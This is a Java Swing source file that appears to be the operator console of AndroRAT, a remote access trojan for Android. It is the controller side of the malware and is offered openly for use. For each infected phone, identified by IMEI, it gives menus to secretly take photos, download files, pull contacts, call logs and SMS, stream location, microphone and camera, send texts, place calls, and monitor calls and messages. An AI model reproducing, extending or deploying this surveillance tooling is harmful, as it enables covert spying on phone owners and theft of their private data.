package gui;

import gui.panel.CallLogPanel;
import gui.panel.ColorPane;
import gui.panel.ContactPanel;
import gui.panel.FileTreePanel;
import gui.panel.HomePanel;
import gui.panel.MapPanel;
import gui.panel.MonitorPanel;
import gui.panel.PicturePanel;
import gui.panel.SMSLogPanel;
import gui.panel.SoundPanel;
import gui.panel.VideoPanel;

import inout.Protocol;
import utils.Contact;
import utils.MyFile;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JMenuBar;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import javax.swing.BoxLayout;
import javax.swing.JMenu;
import javax.swing.JMenuItem;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import javax.swing.KeyStroke;

import Packet.AdvancedInformationPacket;
import Packet.CallPacket;
import Packet.SMSPacket;

import java.awt.event.KeyEvent;
import java.awt.event.InputEvent;
import java.awt.Color;
import java.awt.Toolkit;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import javax.swing.JSplitPane;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

public class UserGUI extends JFrame implements WindowListener {
	
	private JPanel contentPane;
	private JTabbedPane tabbedPane;
	
	private HomePanel homePanel;
	private MapPanel mapPanel;
	private SoundPanel soundPanel;
	private PicturePanel picturePanel;
	private FileTreePanel fileTreePanel;
	private CallLogPanel callLogPanel;
	private ContactPanel contactPanel;
	private MonitorPanel monitorCall, monitorSMS;
	private VideoPanel videoPanel;
	private ColorPane userLogPanel;
	private SMSLogPanel smsPanel;
	
	private HashMap<JPanel, Integer> panChanMap;
	
	private String imei;
	private GUI gui;
	
	public UserGUI(String imei, GUI gui) {
		setIconImage(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/androrat_logo_32pix.png")));
		this.imei = imei;
		this.gui = gui;
		
		panChanMap = new HashMap<JPanel, Integer>();
		
		this.initGUI();
		
		this.setLocationRelativeTo(null);
		this.setTitle("User GUI of imei : "+imei);
		this.setVisible(true);
		this.setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		this.fireGetAdvancedInformations();
	}
	
	public void launchMessageDialog(String txt, String title, int type) {
		JOptionPane.showMessageDialog(this,txt,title,type);
	}
	
	@Override
	public void windowClosing(WindowEvent e) {
		System.out.println("Closing user window");
		if(mapPanel != null) {
			if(mapPanel.getStreaming()) gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
		}
		if(soundPanel != null) {
			if(soundPanel.getStreaming()) gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
		}
		if(monitorCall != null) {
			if(monitorCall.getMonitoring()) gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
		}
		if(monitorSMS != null) {
			if(monitorSMS.getMonitoring()) gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
		}
		if(videoPanel != null) {
			if(videoPanel.getStreaming()) gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
		}
		gui.closeUserGUI(imei);
	}
	
	public void removeTab(JPanel viewer) {
		if(viewer instanceof MapPanel) {
			if(mapPanel.getStreaming()) gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
			mapPanel = null;
		}
		if(viewer instanceof SoundPanel) {
			if(soundPanel.getStreaming()) gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
			soundPanel = null;
		}
		if(viewer instanceof VideoPanel) {
			if(videoPanel.getStreaming()) gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
			videoPanel = null;
		}
		if(viewer instanceof PicturePanel) picturePanel = null;
		if(viewer instanceof FileTreePanel) fileTreePanel = null;
		if(viewer instanceof CallLogPanel) callLogPanel = null;
		if(viewer instanceof SMSLogPanel) smsPanel = null;
		if(viewer instanceof ContactPanel) contactPanel = null;
		if(viewer instanceof MonitorPanel) {
			if(((MonitorPanel) viewer).getCallMonitor()) {
				if(monitorCall.getMonitoring()) gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
				monitorCall = null;
			} else {
				if(monitorSMS.getMonitoring()) gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
				monitorSMS = null;
			}
		}
		tabbedPane.remove(viewer);
	}
	
	
	// ********************
	// M�thodes pour home
	// ********************
	
	
	public void updateHomeInformations(AdvancedInformationPacket packet) {
		homePanel.updateInformations(packet);
	}
	
	public void updatePreference(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		homePanel.updatePreferences(ip, port, wait, phones, sms, kw);
	}
	
	public void fireGetAdvancedInformations() {
		gui.fireGetAdvInformations(imei);
	}
	
	public void fireSaveConnectConfigurations(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		gui.fireSaveConnectConfiguration(imei, ip, port, wait, phones, sms, kw);
	}
	
	
	
	// ********************
	// M�thodes pour la Map
	// ********************
	
	public void updateMap(double lon, double lat, double alt, float speed, float accuracy) {
		if(mapPanel != null) mapPanel.updateMap(lon, lat, alt, speed, accuracy);
	}
	
	public void fireStartGPSStreaming(String provider) {
		gui.fireStartGPSStreaming(imei, provider);
	}
	
	public void fireStopGPSStreaming() {
		gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
	}
	
	
	// *********************
	// M�thodes pour l'image
	// *********************
	
	public void updatePicture(byte[] picture) {
		if(picturePanel != null) picturePanel.updateImage(picture);
	}
	
	public void fireTakePicture() {
		gui.fireTakePicture(imei);
	}
	
	
	// *********************
	// M�thodes pour le son
	// *********************
	
	public void addSoundBytes(byte[] data) {
		if(soundPanel != null) soundPanel.addSoundBytes(data);
	}
	
	public void fireStartSoundStreaming(int source) {
		gui.fireStartSoundStreaming(imei, source);
	}
	
	public void fireStopSoundStreaming() {
		gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
	}
	
	
	// ****************************
	// M�thodes pour la video
	// ****************************
	
	
	public void addVideoBytes(byte[] data) {
		if(videoPanel != null)
			videoPanel.addVideoBytes(data);
	}
	
	public void fireStartVideoStream() {
		gui.fireStartVideoStream(imei);
	}
	
	public void fireStopVideoStream() {
		gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
	}
	
	
	// ****************************
	// M�thodes pour l'arborescence
	// ****************************
	
	public void updateFileTree(ArrayList<MyFile> fileList) {
		if(fileTreePanel != null) fileTreePanel.updateFileTree(fileList);
	}
	
	public void fireFileDownload(String path, String downPath, String downName) {
		gui.fireFileDownload(imei, path, downPath, downName);
	}
	
	public void fireTreeFile() {
		gui.fireTreeFile(imei);
	}
	
	
	// ****************************
	// M�thodes pour les call logs
	// ****************************
	
	public void updateCallLogs(ArrayList<CallPacket> logsList) {
		if(callLogPanel != null) callLogPanel.updateCallLogs(logsList);
	}
	
	public void fireGetCallLogs(String request) {
		gui.fireCallLogs(imei, request);
	}
	
	
	// ****************************
	// M�thodes pour les SMS
	// ****************************
	
	public void updateSMS(ArrayList<SMSPacket> sms) {
		if(smsPanel != null) smsPanel.updateSMS(sms);
	}
	
	public void fireGetSMS(String request) {
		gui.fireGetSMS(imei, request);
	}
	
	
	// ****************************
	// M�thodes pour les contacts
	// ****************************
	
	public void updateContacts(ArrayList<Contact> contacts) {
		if(contactPanel != null) contactPanel.updateContactList(contacts);
	}
	
	public void fireGetContacts() {
		gui.fireContacts(imei);
	}
	
	public void fireGiveCall(String number) {
		gui.fireGiveCall(imei, number);
	}
	
	public void fireSendSMS(String number, String txt) {
		HashMap<String, String> map = new HashMap<String, String>();
		map.put(Protocol.KEY_SEND_SMS_NUMBER, number);
		map.put(Protocol.KEY_SEND_SMS_BODY, txt);
		gui.fireSendSMS(imei, map);
	}
	
	
	// ****************************
	// M�thodes pour monitors
	// ****************************
	
	public void addMonitoredCall(int type, String phoneNumber) {
		if(monitorCall != null) monitorCall.addMonitoredCall(type, phoneNumber);
	}
	
	public void addMonitoredSMS(String addr, long date, String body) {
		if(monitorSMS != null) monitorSMS.addMonitoredSMS(addr, date, body);
	}
	
	public void fireStartCallMonitoring(HashSet<String> phoneNumbers) {
		gui.fireStartCallMonitoring(imei, phoneNumbers);
	}
	
	public void fireStopCallMonitoring() {
		gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
	}
	
	public void fireStartSMSMonitoring(HashSet<String> phoneNumbers) {
		gui.fireStartSMSMonitoring(imei, phoneNumbers);
	}
	
	public void fireStopSMSMonitoring() {
		gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
	}
	
	
	// ****************************
	// M�thodes de save channel
	// ****************************
	
	public void saveMapChannel(int channel) {
    	panChanMap.put(mapPanel, channel);
    }
    
    public void saveCallLogChannel(int channel) {
    	panChanMap.put(callLogPanel, channel);
    }
    
    public void saveContactChannel(int channel) {
    	panChanMap.put(contactPanel, channel);
    }
    
    public void saveMonitorSMSChannel(int channel) {
    	panChanMap.put(monitorSMS, channel);
    }
    
    public void saveMonitorCallChannel(int channel) {
    	panChanMap.put(monitorCall, channel);
    }
    
    public void savePictureChannel(int channel) {
    	panChanMap.put(picturePanel, channel);
    }
    
    public void saveSoundChannel(int channel) {
    	panChanMap.put(soundPanel, channel);
    }
    
    public void saveVideoChannel(int channel) {
    	panChanMap.put(videoPanel, channel);
    }
	
	
	// ****************************
	// M�thodes des boutons UserGUI
	// ****************************
	
	private void fireButtonTakePicture() {
		if(picturePanel == null) {
			picturePanel = new PicturePanel(this);
			tabbedPane.addTab("Picture viewer", picturePanel);
		}
		tabbedPane.setSelectedComponent(picturePanel);
	}
	
	private void fireButtonFileTree() {
		if(fileTreePanel == null) {
			fileTreePanel = new FileTreePanel(this);
			tabbedPane.addTab("File tree viewer", fileTreePanel);
		}
		tabbedPane.setSelectedComponent(fileTreePanel);
	}
	
	private void fireButtonCallLogs() {
		if(callLogPanel == null) {
			callLogPanel = new CallLogPanel(this);
			tabbedPane.addTab("Call logs", callLogPanel);
		}
		tabbedPane.setSelectedComponent(callLogPanel);
	}
	
	private void fireButtonContacts() {
		if(contactPanel == null) {
			contactPanel = new ContactPanel(this);
			tabbedPane.addTab("Contacts", contactPanel);
		}
		tabbedPane.setSelectedComponent(contactPanel);
	}
	
	private void fireButtonStreamingGPS() {
		if(mapPanel == null) {
			mapPanel = new MapPanel(this);
			tabbedPane.addTab("Map viewer", mapPanel);
		}
		tabbedPane.setSelectedComponent(mapPanel);
	}
	
	private void fireButtonStreamingSound() {
		if(soundPanel == null) {
			soundPanel = new SoundPanel(this);
			tabbedPane.addTab("Sound listener", soundPanel);
		}
		tabbedPane.setSelectedComponent(soundPanel);
	}
	
	private void fireButtonStreamingVideo() {
		if(videoPanel == null) {
			videoPanel = new VideoPanel(this);
			tabbedPane.addTab("Video player", videoPanel);
		}
		tabbedPane.setSelectedComponent(videoPanel);
	}
	
	private void fireButtonSMS() {
		if(smsPanel == null) {
			smsPanel = new SMSLogPanel(this);
			tabbedPane.addTab("SMS viewer", smsPanel);
		}
		tabbedPane.setSelectedComponent(smsPanel);
	}
	
	private void fireButtonToastMessage() {
		String txt = JOptionPane.showInputDialog(this, "Enter your text :");
		gui.fireToastMessage(imei, txt);
	}
	
	private void fireButtonFinish() {
		this.windowClosing(null);
		this.dispose();
	}
	
	public void fireButtonCloseTab() {
		JPanel panel = (JPanel) tabbedPane.getSelectedComponent();
		if(panel == homePanel) {
			JOptionPane.showMessageDialog(this,"You can't close the home tab !","Forbiden action",JOptionPane.ERROR_MESSAGE);
		} else {
			this.removeTab(panel);
		}
	}
	
	private void fireButtonSendSMS() {
		SMSDialog dialog = new SMSDialog(this);
		String[] res = dialog.showDialog();
		if(res != null) {
			HashMap<String, String> map = new HashMap<String, String>();
			map.put(Protocol.KEY_SEND_SMS_NUMBER, res[0]);
			map.put(Protocol.KEY_SEND_SMS_BODY, res[1]);
			gui.fireSendSMS(imei, map);
		}
	}
	
	private void fireButtonGiveCall() {
		String target = JOptionPane.showInputDialog(this, "Enter the target cell number :");
		if(target != null) gui.fireGiveCall(imei, target);
	}
	
	private void fireButtonMonitorCall() {
		if(monitorCall == null) {
			monitorCall = new MonitorPanel(this, true);
			tabbedPane.addTab("Call monitor", monitorCall);
		}
		tabbedPane.setSelectedComponent(monitorCall);
	}
	
	private void fireButtonMonitorSMS() {
		if(monitorSMS == null) {
			monitorSMS = new MonitorPanel(this, false);
			tabbedPane.addTab("SMS monitor", monitorSMS);
		}
		tabbedPane.setSelectedComponent(monitorSMS);
	}
	
	
	
	

	/**
	 * Create the frame.
	 * Don't touch the code !!
	 */
	private void initGUI() {
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 672, 584);
		
		JMenuBar menuBar = new JMenuBar();
		setJMenuBar(menuBar);
		
		JMenu mnOptions = new JMenu("Options");
		menuBar.add(mnOptions);
		
		JMenuItem mntmCloseInterface = new JMenuItem("Close Window");
		mntmCloseInterface.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonFinish();
			}
		});
		
		JMenuItem mntmCloseTabViewer = new JMenuItem("Close Tab");
		mntmCloseTabViewer.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R, InputEvent.CTRL_MASK));
		mntmCloseTabViewer.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonCloseTab();
			}
		});
		mnOptions.add(mntmCloseTabViewer);
		mnOptions.add(mntmCloseInterface);
		
		JMenu mnRcuprationDeDonnes = new JMenu("Get Android data");
		menuBar.add(mnRcuprationDeDonnes);
		
		JMenuItem mntmPrendrePhoto = new JMenuItem("Take picture");
		mnRcuprationDeDonnes.add(mntmPrendrePhoto);
		mntmPrendrePhoto.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonTakePicture();
			}
		});
		
		JMenuItem mntmFileTree = new JMenuItem("File tree");
		mnRcuprationDeDonnes.add(mntmFileTree);
		mntmFileTree.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonFileTree();
			}
		});
		
		JMenuItem mntmContacts = new JMenuItem("Contacts");
		mnRcuprationDeDonnes.add(mntmContacts);
		mntmContacts.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonContacts();
			}
		});
		
		JMenuItem mntmCallLogs = new JMenuItem("Call logs");
		mnRcuprationDeDonnes.add(mntmCallLogs);
		mntmCallLogs.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonCallLogs();
			}
		});
		
		JMenuItem mntmSms = new JMenuItem("SMS");
		mntmSms.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				fireButtonSMS();
			}
		});
		mnRcuprationDeDonnes.add(mntmSms);
		
		JMenu mnStreaming = new JMenu("Streaming");
		mnRcuprationDeDonnes.add(mnStreaming);
		
		JMenuItem mntmCoordonnesGps = new JMenuItem("Localisation");
		mntmCoordonnesGps.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonStreamingGPS();
			}
		});
		mnStreaming.add(mntmCoordonnesGps);
		
		JMenuItem mntmSon = new JMenuItem("Audio");
		mntmSon.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonStreamingSound();
			}
		});
		mnStreaming.add(mntmSon);
		
		JMenuItem mntmVido = new JMenuItem("Video");
		mntmVido.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonStreamingVideo();
			}
		});
		mnStreaming.add(mntmVido);
		
		JMenu mnEnvoiDeCommandes = new JMenu("Send command");
		menuBar.add(mnEnvoiDeCommandes);
		
		JMenuItem mntmSendToastMessage = new JMenuItem("Toast message");
		mntmSendToastMessage.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonToastMessage();
			}
		});
		mnEnvoiDeCommandes.add(mntmSendToastMessage);
		
		JMenuItem mntmSendSms = new JMenuItem("Send SMS");
		mntmSendSms.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonSendSMS();
			}
		});
		mnEnvoiDeCommandes.add(mntmSendSms);
		
		JMenuItem mntmGiveCall = new JMenuItem("Give call");
		mntmGiveCall.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonGiveCall();
			}
		});
		mnEnvoiDeCommandes.add(mntmGiveCall);
		
		JMenu mnMonitoring = new JMenu("Monitoring");
		menuBar.add(mnMonitoring);
		
		JMenuItem mntmCallMonitor = new JMenuItem("Call monitor");
		mntmCallMonitor.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonMonitorCall();
			}
		});
		mnMonitoring.add(mntmCallMonitor);
		
		JMenuItem mntmSmsMonitor = new JMenuItem("SMS monitor");
		mntmSmsMonitor.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonMonitorSMS();
			}
		});
		mnMonitoring.add(mntmSmsMonitor);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new BoxLayout(contentPane, BoxLayout.X_AXIS));
		
		JSplitPane splitPane = new JSplitPane();
		splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
		contentPane.add(splitPane);
		
		JScrollPane scrollPane = new JScrollPane();
		splitPane.setRightComponent(scrollPane);
		
        userLogPanel = new ColorPane();
        scrollPane.setViewportView(userLogPanel);
		
        //JTextArea textArea = new JTextArea();
		//scrollPane.setViewportView(textArea);
		
		tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		splitPane.setLeftComponent(tabbedPane);
		
		homePanel = new HomePanel(this);
		tabbedPane.addTab("Home", null, homePanel, null);
		
		//tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		//contentPane.add(tabbedPane);
		//splitPane.add(tabbedPane);
		
		addWindowListener(this);
	}

	@Override
	public void windowOpened(WindowEvent e) {
	}

	@Override
	public void windowClosed(WindowEvent e) {
	}

	@Override
	public void windowIconified(WindowEvent e) {
	}

	@Override
	public void windowDeiconified(WindowEvent e) {
	}

	@Override
	public void windowActivated(WindowEvent e) {
	}

	@Override
	public void windowDeactivated(WindowEvent e) {
	}
	
	public String getImei() {
		return imei;
	}
	
	public GUI getGUI() {
		return gui;
	}
	
    public void logTxt(long date, String txt) {
    	userLogPanel.append(Color.black, (new Date(date)+ " "+txt+"\n"));
    }
    
    public void errLogTxt(long date, String txt) {
    	userLogPanel.append(Color.red, (new Date(date)+ " "+txt+"\n"));
    }


}
